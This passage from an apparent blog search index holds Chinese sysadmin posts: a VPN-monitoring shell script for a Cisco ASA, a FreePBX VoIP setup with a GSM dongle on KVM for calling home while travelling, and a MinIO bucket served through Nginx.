ASA5520的私网地址。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e -eq \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edo\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003elive\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eping -c4 \u003cspan class=\"s2\"\u003e\u0026#34;192.168.101.99\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003ewc -l\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"nv\"\u003e$live\u003c/span\u003e -eq \u003cspan class=\"m\"\u003e5\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        /usr/local/bin/mailsend-go -debug -to \u003cspan class=\"s2\"\u003e\u0026#34;ranrui.zhang@rendoumi.com\u0026#34;\u003c/span\u003e -from monit@ddky.com -ssl -port \u003cspan class=\"m\"\u003e465\u003c/span\u003e -smtp smtp.qiye.aliyun.com \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e             auth -user \u003cspan class=\"s2\"\u003e\u0026#34;monit@ddky.com\u0026#34;\u003c/span\u003e -pass \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e             -sub \u003cspan class=\"s2\"\u003e\u0026#34;vpn断了\u0026#34;\u003c/span\u003e body -msg \u003cspan class=\"s2\"\u003e\u0026#34;`date +%Y`年`date +%m`月`date +%d`日 vpn断了！！！\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e             -cs \u003cspan class=\"s2\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        /usr/local/bin/revpn.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;`date +%Y`年`date +%m`月`date +%d`日 `date +%H`点`date +%M`分\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                线路不能到达王府井机房，重启VPN。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sleep \u003cspan class=\"m\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    sleep \u003cspan class=\"m\"\u003e60\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e以下是用expect自动登录Cisco路由器重启vpn的脚本 revpn.sh\u003c/p\u003e","title":"Cisco ASA5520 VPN线路的监控和自动重启"},{"content":"新的一年依始，开始定好了旅行计划，但是有个东西却依然心神不宁。\n那就是万一在国外有什么变动，如何往国内打电话呢？！\n说到这里，不得不提个东西，那就是旅顺的App，这个东西已经消失了，但是绝对值得被记住啊。\n这个东西在塞班岛旅游的时候曾经救了自己两次\n首先是它的第一代产品：\n第一代的原理似乎是把手机的信号直接通过网络转移到了国内，随身携带然后配合app使用，这点非常牛吧！国内的窜出点会随机，忽而天津，忽而别的地方，所以呼出电话搞不好是长途计费。第一次呢八戒是在塞班岛中部那个麦当劳附近，用这个接到了国内的电话，说是出大事了，有人把公司数据库的数据给改了，当时约定下午6：00再打，然后下午在台湾牛肉面的店里，又用这个往国内通了电话，打了半个多小时，领导告知了具体的情况，要是接不起来那可真就麻烦大了。\n这个是它第二代的产品：\n这个是升级版pro，就更厉害了，直接放家里，手机上下个app，有网络就能用了，不用像第一代一样随身携带了。\n这个更是救命了，话说第二回在塞班的时候正是疫情刚发作的时候，塞班直接封岛了，然后好多航班都延期或终止了，就是用这个旅顺打国内电话改签了回国的机票，足足打了两个小时啊，到处占线等待，如果打国际长途的话费用不堪设想，另外打塞班大韩航空的电话改签两程机票也是不可想像的，所以，关键时刻是真的救命啊。\n这么好的软件却直接倒闭消失了，真是万分可惜啊。\n哎，现在没有这个了，只能自己搭一个voip电话自用了。\n刚开始是考虑RasPBX，其实自己用树莓派搭过，费事不说，主要树莓派容易死机，务必要稳定，所以干脆用FreePBX搭建在kvm服务器虚拟机上的方式，来保持绝对稳定。\n以下教程只适用于 FreePBX 16 的官方ISO，具体做法如下：\n一、安装KVM虚机： #下载FreePBX16的iso光盘 wget https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso #创建qcow2虚机文件 qemu-img create -f qcow2 freepbx-8-2-60/freepbx-8-2-60.qcow2 20G virt-install \\ --name=freepbx-8-2-60 \\ --vcpu=4 \\ --ram=8096 \\ --disk path=/export/kvm/freepbx-8-2-60/freepbs-8-2-60.qcow2,format=qcow2,size=20 \\ --cdrom=/export/kvm/SNG7-PBX16-64bit-2302-1.iso \\ --network bridge=br0 \\ --os-type=linux \\ --vnc --vnclisten=0.0.0.0 --vncport=5916 用vnc连接5916端口安装，设置一下root的密码安装。\n这样安装好后，系统其实是dhcp动态获得ip的，进入看了看，是Centos，我们不需要dhcp，把IP给固定死\nvi /etc/sysconfig/network-scripts/ifcfg-eth0 TYPE=\u0026#34;Ethernet\u0026#34; BOOTPROTO=\u0026#34;static\u0026#34; IPADDR=10.8.2.60 NETMASK=255.255.255.0 GATEWAY=10.8.2.1 DNS1=114.114.114.114 DEFROUTE=\u0026#34;yes\u0026#34; NAME=\u0026#34;eth0\u0026#34; DEVICE=\u0026#34;eth0\u0026#34; ONBOOT=\u0026#34;yes\u0026#34; SSH登录一下没问题，看到绿框就ok了\n二、配置FreePBX的分机 打开网址 http://10.8.2.60 , 登录 FreePBX Administration\n登上去后是这个样子\n上面我没有开System Firewall，这个看个人需求，绝对不要像公网开放80端口，只开5060的udp和1000-10004的UDP。\n开了公网80的话，那就是另外一个悲伤的故事了！！！\n然后建立第一个分机888：\n直接在Applications-\u0026gt;Extensions-\u0026gt;Add new Chan_SIP Extension新建一个分机，在Generaltab页里面填好第一个SIP账户的信息\nGeneral填写:\nUser Extension 分机号为888 Display Name 为 ba jie，最好自己名字，好区分 Secret 是密码，要填写个非常复杂的，绝对不能简单。 然后最底下，Submit 提交一下\n最后点击右上角的Apply Config应用刚才的配置。\n三、配置dongle无线卡 内部分机有了，我们需要配置外部线路\n去淘宝上买个dongle卡，插到服务器上\n登录服务器，lsusb 查看一下usb的地址\n得到 vendori d: 12d1 和 product id: 1436 这两个字串，编辑一个文件 usb-attach.xml 文件：\nvi usb-attach.xml \u0026lt;hostdev mode=\u0026#39;subsystem\u0026#39; type=\u0026#39;usb\u0026#39;\u0026gt; \u0026lt;source\u0026gt; \u0026lt;vendor id=\u0026#39;0x12d1\u0026#39;/\u0026gt; \u0026lt;product id=\u0026#39;0x1436\u0026#39;/\u0026gt; \u0026lt;/source\u0026gt; \u0026lt;/hostdev\u0026gt; 然后挂接上\nvirsh attach-device freepbx-8-2-60 --file usb_huawei.xml --persistent ssh登录进入freepbx，lsusb查看一下，同样能看到就对了\n然后就是大工程了，编译驱动程序，非常的复杂\n不想编译的办法：\n# 解压包 unzip -x dongle.zip cp chan_dongle.so /usr/lib64/asterisk/modules chmod 644 /usr/lib64/asterisk/modules/chan_dongle.so 完整的编译的方法：\n#解压包 unzip asterisk-chan-dongle-master* #安装准备包编译 yum install automake autotools-dev autoconf yum -y install tcl asterisk18-devel make automake binutils #编译安装 cd asterisk-chan-dongle-master/ autoupdate aclocal autoconf automake -a ./bootstrap ./configure --with-astversion=18.19.0 make clean make make install cd /usr/lib64/asterisk/modules ls -lcat|more 看到有dongle字样就ok了\n没完呢啊，还需要把配置文件都弄进去\n#解压 unzip -x dongle.zip #install dongles driver cd echo \u0026#39;KERNEL==\u0026#34;ttyUSB*\u0026#34;, MODE=\u0026#34;0666\u0026#34;, OWNER=\u0026#34;asterisk\u0026#34;, GROUP=\u0026#34;uucp\u0026#34;\u0026#39;\u0026gt;/etc/udev/rules.d/92-dongle.rules echo \u0026#39;rungroup = dialout\u0026#39;\u0026gt;\u0026gt;/etc/asterisk/asterisk.conf mv dongle.conf /etc/asterisk/dongle.conf chown asterisk.asterisk /etc/asterisk/dongle.conf chmod 664 /etc/asterisk/dongle.conf mv extensions_custom.conf /etc/asterisk/extensions_custom.conf chown asterisk.asterisk /etc/asterisk/extensions_custom.conf chmod 664 /etc/asterisk/extensions_custom.conf 下载地址：dongle.zip\n然后把虚机reboot一下，进入asterisk查看\nasterisk -rvvv dongle show devices 看到自己dongle设备的id，是dongle1，记下来，就ok\n四、配置FreePBX的进出线路 1、增加trunk 回到 FreePBX 的配置界面，先配一下 Trunk 线路，增加一个trunk:connectivity-\u0026gt;Trunks\n增加一个 Custom Trunk:\nGeneral填写：\nTrunk Name : china_unicom Outbound CallerID: 空 （联通手机号，最好空，后面有提示忽略，这个接打的时候会自动替你填上的） Maximum Channels: 1 (只有一个联通sim卡，就是1，2个就是2) 然后点到custom Settings，填入如下内容，注意，我的设备是dongle1，按查出来的设备填写啊。\ndongle/dongle1/$OUTNUM$ 然后同样 Submit， 然后 Apply config. 会提示CallerID，ok忽略即可。\n2、配置拨入线路Inbound route connectivity-\u0026gt;Inbound Routes\n增加一个新的Inbound，名字就叫gsm_in，可以随便改。DID和CallerID都是ANY，意味着所有达到这个sim卡内的电话都接下来，Destination选择咱们一开始的888分机，这样呼入的电话就可以被888分机接听了\nDescription: gsm_in DID Number: ANY CallerID Number: ANY Set Destination: Extensions ​ 888 zhang ranrui 最后同样 Submit , Apply Config配置生效\n3、配置拨出线路Outbound Routes connectivity-\u0026gt;Outbound Routes\n增加一条新的拨出线路，名字叫gsm_out好了，可以随便改，Trunk选咱们建立的 china_unicom\nRoute Name : gsm_out\nTrunk Sequence for Matched Routes: china_unicom\n注意，点到拨号盘，还需要配一下 Dail Patterns\nMatch Pattern: ZX. ZX. 的意思是拨出去的号码最少有3个数字那么长，且第一位不是0，那手机11位，起始是1就满足了。很多教程教配个1和9什么的，有毛病啊，拨出去还要加拨1和9\n最后仍然是Submit，Apply Config配置生效。\n这样基本上就完工了\n五、配置手机端voip软件 网上大多数的教程都是用zoiper，这里强烈指出，这个软件根本不行！！！\n一是zoiper必须运行在前台才能接起来打到dongle里的电话，二是zoiper里gsm好的音频编码居然是收费的。\n网上搜了半天，终于找到了个好的，PortSIP，iphone下也是必须用外区id才能搜到并下载安装。\n这个软件其实是一家提供pbx服务的公司提供的客户端，可以接起来打到asterisk手机卡里的手机，而且音频编码g.729等等都是免费的。\n那必须赞一个。高级设置里强制和集成就是接起来的保证，不过会大面积耗电。\n音频编码器中g.729也是免费的。比zoiper还收你钱厚道多了。\n设置也及其简单：\n域名和出站代理都写Freepbx暴露出去的公网ip即可\n用户名就是pbx添加的那个分机888，密码就是secret。\n八戒亲自在泰国普吉测试了很多次，完胜zoiper，强烈推荐啊。\n六、路由器设置 有公网设置，需要做端口映射\n路由器Port 5060 udp --\u0026gt; FreePBX Port 5060 udp 路由器Port 10000-\u0026gt;10004 udp --\u0026gt; FreePBX Port 10000-10004 udp 10000到10004的端口映射出去是因为语音一路，数据一路，我们只有一个sim卡，4路足够了。\n七、补充 在freepbx上面发送短信的命令\nasterisk -rx \u0026#34;dongle sms dongle1 +8613000000000 信息测试\u0026#34; ","permalink":"https://rendoumi.com/posts/20240105-voip_iphone/","summary":"\u003cp\u003e新的一年依始，开始定好了旅行计划，但是有个东西却依然心神不宁。\u003c/p\u003e\n\u003cp\u003e那就是万一在国外有什么变动，如何往国内打电话呢？！\u003c/p\u003e\n\u003cp\u003e说到这里，不得不提个东西，那就是旅顺的App，这个东西已经消失了，但是绝对值得被记住啊。\u003c/p\u003e\n\u003cp\u003e这个东西在塞班岛旅游的时候曾经救了自己两次\u003c/p\u003e\n\u003cp\u003e首先是它的第一代产品：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105135104823\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105135104823.png\"\u003e\u003c/p\u003e\n\u003cp\u003e第一代的原理似乎是把手机的信号直接通过网络转移到了国内，随身携带然后配合app使用，这点非常牛吧！国内的窜出点会随机，忽而天津，忽而别的地方，所以呼出电话搞不好是长途计费。第一次呢八戒是在塞班岛中部那个麦当劳附近，用这个接到了国内的电话，说是出大事了，有人把公司数据库的数据给改了，当时约定下午6：00再打，然后下午在台湾牛肉面的店里，又用这个往国内通了电话，打了半个多小时，领导告知了具体的情况，要是接不起来那可真就麻烦大了。\u003c/p\u003e\n\u003cp\u003e这个是它第二代的产品：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105135031364\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105135031364.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这个是升级版pro，就更厉害了，直接放家里，手机上下个app，有网络就能用了，不用像第一代一样随身携带了。\u003c/p\u003e\n\u003cp\u003e这个更是救命了，话说第二回在塞班的时候正是疫情刚发作的时候，塞班直接封岛了，然后好多航班都延期或终止了，就是用这个旅顺打国内电话改签了回国的机票，足足打了两个小时啊，到处占线等待，如果打国际长途的话费用不堪设想，另外打塞班大韩航空的电话改签两程机票也是不可想像的，所以，关键时刻是真的救命啊。\u003c/p\u003e\n\u003cp\u003e这么好的软件却直接倒闭消失了，真是万分可惜啊。\u003c/p\u003e\n\u003cp\u003e哎，现在没有这个了，只能自己搭一个voip电话自用了。\u003c/p\u003e\n\u003cp\u003e刚开始是考虑RasPBX，其实自己用树莓派搭过，费事不说，主要树莓派容易死机，务必要稳定，所以干脆用FreePBX搭建在kvm服务器虚拟机上的方式，来保持绝对稳定。\u003c/p\u003e\n\u003cp\u003e以下教程只适用于 FreePBX 16 的官方ISO，具体做法如下：\u003c/p\u003e\n\u003ch2 id=\"一安装kvm虚机\"\u003e一、安装KVM虚机：\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#下载FreePBX16的iso光盘\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#创建qcow2虚机文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 freepbx-8-2-60/freepbx-8-2-60.qcow2 20G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003efreepbx-8-2-60 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e8096\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/freepbx-8-2-60/freepbs-8-2-60.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/SNG7-PBX16-64bit-2302-1.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5916\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e用vnc连接5916端口安装，设置一下root的密码安装。\u003c/p\u003e\n\u003cp\u003e这样安装好后，系统其实是dhcp动态获得ip的，进入看了看，是Centos，我们不需要dhcp，把IP给固定死\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/sysconfig/network-scripts/ifcfg-eth0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Ethernet\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;static\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eIPADDR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.8.2.60\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNETMASK\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.255.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eGATEWAY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.8.2.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDNS1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e114.114.114.114\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEFROUTE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;yes\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;eth0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;eth0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;yes\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSSH登录一下没问题，看到绿框就ok了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105141241964\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105141241964.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"二配置freepbx的分机\"\u003e二、配置FreePBX的分机\u003c/h2\u003e\n\u003cp\u003e打开网址 http://10.8.2.60 , 登录 FreePBX Administration\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105144025926\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105144025926.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登上去后是这个样子\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240105144212316\" loading=\"lazy\" src=\"/posts/20240105-voip_iphone/image-20240105144212316.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上面我没有开System Firewall，这个看个人需求，绝对不要像公网开放80端口，只开5060的udp和1000-10004的UDP。\u003c/p\u003e","title":"最新版出国旅行安装一个FreePBX的voip电话自用"},{"content":"同事有个需求，想开放个域名，给别的同事们下载文件用。\n这个其实很建单，问题就是文件怎么放上去，sftp、ftp什么的都需要搭个服务器，其实最简单应该是webdav，但是放公网又不太安全。\n本来考虑是用 oss 的桶，前面直接套个CDN，但是如果桶文件泄露被疯狂下载，也会付出银两。\n最后做法是用 Minio 弄一个模拟的桶环境，前面配置上 Nginx，带宽限制到1M，这样就无所谓了。同事用另一台机器模拟S3的API往上面放文件供下载。\n一、minio的安装\n下载二进制文件，简单粗暴启动：\n#!/bin/bash nohup /app/minio/minio server --address \u0026#39;0.0.0.0:9000\u0026#39; --console-address \u0026#39;0.0.0.0:9001\u0026#39; /app/bucket \u0026gt; /app/minio/minio.log 2\u0026gt;\u0026amp;1 \u0026amp; 这样就启动了，然后网页打开 http://10.10.247.211:9000 ，就可以看到登录界面了\n登录后，我们先建立一个Bucket，就叫做pub桶，把pub桶的策略改成public，这样nginx代理的时候才能直接访问到\n然后我们上传个图片，BOMS3.0.png，然后去/app/bucket目录下看看\n结果发现BOMS3.0.png居然是个目录，进去继续看\nmeta信息和若干的part，看来这是为多版本准备的，这就是为什么要策略是public的原因，不是就无法从9000访问。\n二、安装配置nginx\nserver { listen 80; listen [::]:80; server_name supervisor-task.ddky.com; location / { return 301 https://supervisor-task.ddky.com$request_uri; } } server { listen 443 ssl; server_name supervisor_task.ddky.com; ssl_certificate /etc/nginx/cert/_.ddky.com.crt; ssl_certificate_key /etc/nginx/cert/_.ddky.com.key; ssl_session_timeout 5m; location / { rewrite ^/$ /pub/index.html break; proxy_pass http://10.10.247.211:9000/pub/; proxy_redirect off; } access_log /app/logs/access.log ; error_log /app/logs/error.log; } 主要就是要配置代理，代理到minio的9000端口\n这样就好了。\n","permalink":"https://rendoumi.com/posts/20231228-minio_nginx/","summary":"\u003cp\u003e同事有个需求，想开放个域名，给别的同事们下载文件用。\u003c/p\u003e\n\u003cp\u003e这个其实很建单，问题就是文件怎么放上去，sftp、ftp什么的都需要搭个服务器，其实最简单应该是webdav，但是放公网又不太安全。\u003c/p\u003e\n\u003cp\u003e本来考虑是用 oss 的桶，前面直接套个CDN，但是如果桶文件泄露被疯狂下载，也会付出银两。\u003c/p\u003e\n\u003cp\u003e最后做法是用 Minio 弄一个模拟的桶环境，前面配置上 Nginx，带宽限制到1M，这样就无所谓了。同事用另一台机器模拟S3的API往上面放文件供下载。\u003c/p\u003e\n\u003cp\u003e一、minio的安装\u003c/p\u003e\n\u003cp\u003e下载二进制文件，简单粗暴启动：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003enohup /app/minio/minio server --address \u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0:9000\u0026#39;\u003c/span\u003e --console-address \u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0:9001\u0026#39;\u003c/span\u003e /app/bucket \u0026gt; /app/minio/minio.log 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就启动了，然后网页打开 http://10.10.247.211:9000 ，就可以看到登录界面了\u003c/p\u003e\n\u003cp\u003e登录后，我们先建立一个Bucket，就叫做pub桶，把pub桶的策略改成public，这样nginx代理的时候才能直接访问到\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20231228140755759\" loading=\"lazy\" 